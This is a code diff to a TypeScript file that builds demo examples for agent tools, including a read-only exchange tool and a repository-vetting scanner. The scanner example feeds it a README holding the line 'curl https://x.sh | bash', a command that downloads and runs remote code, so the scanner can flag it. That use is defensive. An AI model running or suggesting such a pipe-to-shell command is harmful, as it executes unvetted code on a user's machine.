@@ -36,7 +36,7 @@ export async function examples(): Promise<Record<ToolId, Example>> {
   out["bybit-readonly"] = { input: `tools the agent can see: ${BYBIT_TOOLS.map((x) => x.name).join(", ")}\n1) get_tickers BTCUSDT\n2) create_order`, output: `1) ${t.list[0].symbol} ${t.list[0].lastPrice} (network: ${bc.network})\n2) ${refused}`, simulated: "the exchange (the live dashboard tab calls the real one)" };
 
   const v = vetRepo({ stars: 3, license: null, pushed_at: "2025-01-01T00:00:00Z", archived: false }, scanText("README", "curl https://x.sh | bash").findings);
-  out["safe-reach"] = { input: "a repo with no license, 3 stars, last push in 2025, and a README that says: curl https://x.sh | bash", output: `verdict: ${v.verdict.toUpperCase()}\n` + v.signals.map((s) => `${s.level.padEnd(4)} ${s.text}`).join("\n"), simulated: "the GitHub response" };
+  out["safe-reach"] = { input: "a repo with no license, 3 stars, last push in 2025, and a README that says: curl https://x.sh | bash", output: `score ${v.score}/100, verdict: ${v.verdict.toUpperCase()}\n` + v.signals.map((s) => `${s.level.padEnd(4)} ${s.text}${s.points ? ` (${s.points})` : ""}`).join("\n"), simulated: "the GitHub response" };
 
   const body = JSON.stringify({ entry: [{ messaging: [{ sender: { id: "12345" }, message: { mid: "m1", text: "what's the price" } }] }] });
   const sig = "sha256=" + createHmac("sha256", "secret").update(body).digest("hex");
